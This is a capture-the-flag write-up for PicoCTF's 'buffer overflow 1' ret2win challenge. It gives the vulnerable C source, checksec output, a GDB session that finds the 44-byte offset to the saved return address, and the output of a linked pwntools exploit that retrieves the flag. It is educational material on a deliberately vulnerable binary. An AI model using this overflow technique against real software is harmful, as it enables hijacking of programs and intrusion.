### Binary Exploitation

### Source: PicoCTF

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/bof1]
└─$ file vuln 
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=96273c06a17ba29a34bdefa9be1a15436d5bad81, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/bof1]
└─$ checksec vuln 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/CTF/Pico/bof1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Source code is given 

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

Its a basic ret2win chall. Cause the win function isn't called in the main function 

So our plan is to jump to the win function which then we will get the flag

I'll get the offset first which i will do manually then automate it with pwntools

Hop over to gdb then set a breakpoint in the vuln return call

```
└─$ gdb -q vuln                                  
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from vuln...
(No debugging symbols found in vuln)
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x08049281 <+0>:     endbr32 
   0x08049285 <+4>:     push   ebp
   0x08049286 <+5>:     mov    ebp,esp
   0x08049288 <+7>:     push   ebx
   0x08049289 <+8>:     sub    esp,0x24
   0x0804928c <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049291 <+16>:    add    ebx,0x2d6f
   0x08049297 <+22>:    sub    esp,0xc
   0x0804929a <+25>:    lea    eax,[ebp-0x28]
   0x0804929d <+28>:    push   eax
   0x0804929e <+29>:    call   0x8049050 <gets@plt>
   0x080492a3 <+34>:    add    esp,0x10
   0x080492a6 <+37>:    call   0x804933e <get_return_address>
   0x080492ab <+42>:    sub    esp,0x8
   0x080492ae <+45>:    push   eax
   0x080492af <+46>:    lea    eax,[ebx-0x1f9c]
   0x080492b5 <+52>:    push   eax
   0x080492b6 <+53>:    call   0x8049040 <printf@plt>
   0x080492bb <+58>:    add    esp,0x10
   0x080492be <+61>:    nop
   0x080492bf <+62>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080492c2 <+65>:    leave  
   0x080492c3 <+66>:    ret    
End of assembler dump.
gef➤  b *0x080492c2
Breakpoint 1 at 0x80492c2
gef➤  
```

Now i can run it and search for where our input is on the stack

```
gef➤  r
Starting program: /home/mark/Desktop/CTF/Pico/bof1/vuln 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
pwnerhacker
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

Breakpoint 1, 0x080492c2 in vuln ()



[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x40      
$ebx   : 0x804c000  →  0x804bf10  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffd010  →  "pwnerhacker"
$ebp   : 0xffffd038  →  0xffffd058  →  0x00000000
$esi   : 0x8049350  →  <__libc_csu_init+0> endbr32 
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x80492c2  →  <vuln+65> leave 
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd010│+0x0000: "pwnerhacker"        ← $esp
0xffffd014│+0x0004: "rhacker"
0xffffd018│+0x0008: 0x72656b ("ker"?)
0xffffd01c│+0x000c: 0x804c000  →  0x804bf10  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
0xffffd020│+0x0010: 0x8049350  →  <__libc_csu_init+0> endbr32 
0xffffd024│+0x0014: 0xf7ffcb80  →  0x00000000
0xffffd028│+0x0018: 0xffffd058  →  0x00000000
0xffffd02c│+0x001c: 0x8049327  →  <main+99> add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80492bb <vuln+58>        add    esp, 0x10
    0x80492be <vuln+61>        nop    
    0x80492bf <vuln+62>        mov    ebx, DWORD PTR [ebp-0x4]
 →  0x80492c2 <vuln+65>        leave  
    0x80492c3 <vuln+66>        ret    
    0x80492c4 <main+0>         endbr32 
    0x80492c8 <main+4>         lea    ecx, [esp+0x4]
    0x80492cc <main+8>         and    esp, 0xfffffff0
    0x80492cf <main+11>        push   DWORD PTR [ecx-0x4]
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x80492c2 in vuln (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80492c2 → vuln()
[#1] 0x804932f → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Cool now i'll search for our input address then the eip address to get the offset 

```
gef➤  search-pattern pwnerhacker
[+] Searching 'pwnerhacker' in memory
[+] In '[heap]'(0x804d000-0x806f000), permission=rw-
  0x804d1a0 - 0x804d1ad  →   "pwnerhacker\n" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
  0xffffd010 - 0xffffd01b  →   "pwnerhacker" 
gef➤  i f
Stack level 0, frame at 0xffffd040:
 eip = 0x80492c2 in vuln; saved eip = 0x804932f
 called by frame at 0xffffd070
 Arglist at 0xffffd038, args: 
 Locals at 0xffffd038, Previous frame's sp is 0xffffd040
 Saved registers:
  ebx at 0xffffd034, ebp at 0xffffd038, eip at 0xffffd03c
gef➤
```

Doing the math we get the offset `0xffffd03c - 0xffffd010 = 0x2c`

Now here's the exploit to automate everything for us and return to the win function

Exploit [Script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/picoctf/bof1/exploit.py)

Cool now i'll run it on the remote server

```
└─$ python3 exploit.py REMOTE saturn.picoctf.net 55181
[+] Parsing corefile...: Done
[*] '/home/mark/Desktop/CTF/Pico/bof1/core.10463'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xffc04100
    Exe:       '/home/mark/Desktop/CTF/Pico/bof1/vuln' (0x8048000)
    Fault:     0x6161616c
[!] located EIP/RIP offset at 44
[+] Opening connection to saturn.picoctf.net on port 55181: Done
[*] Switching to interactive mode
[*] picoCTF{addr3ss3s_ar3_3asy_c76b273b}
```

And we're done

<br> <br>
[Back To Home](../index.md)
